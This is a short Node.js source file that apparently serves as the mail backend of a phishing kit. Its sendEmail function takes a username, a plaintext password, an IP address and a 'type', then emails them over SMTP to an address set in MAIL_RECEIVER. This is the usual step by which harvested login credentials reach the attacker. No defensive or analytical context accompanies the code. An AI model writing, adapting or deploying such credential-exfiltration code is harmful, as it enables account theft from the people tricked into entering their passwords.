const nodemailer = require('nodemailer')


function createNodeMailerTransport() {    
    return nodemailer.createTransport({
        pool: true,
        host: process.env.SMTP_HOST,
        port: process.env.SMTP_PORT,
        secure: true,
        auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS
        }
    })
}

function sendEmail(res, subject, username, pass, ip, type) {
    const transport = createNodeMailerTransport()

    var mailDetails = {
        from: process.env.SMTP_USER,
        to: process.env.MAIL_RECEIVER,
        subject: subject,
        html: '<p>Username: ' + username + '</p>' + '<p>Password: ' + pass + '</p>' + '<p>Ip Address: ' + ip + '</p>' + '<p>Type: ' + type + '</p>'
    }

    transport.verify(function (error, success) {
        if (error) {
            console.error(error)
            res.status(400).send({ response: 'failed' });
        } else {
            transport.sendMail(mailDetails, function (err, data) {
                if (err) {
                    console.error(error)
                    res.status(400).send({ response: 'failed' });
                } else {
                    console.log("success")
                    res.status(200).send({ response: 'success' })
                }
            });
        }
    })
}


module.exports = {
    sendEmail: sendEmail
}
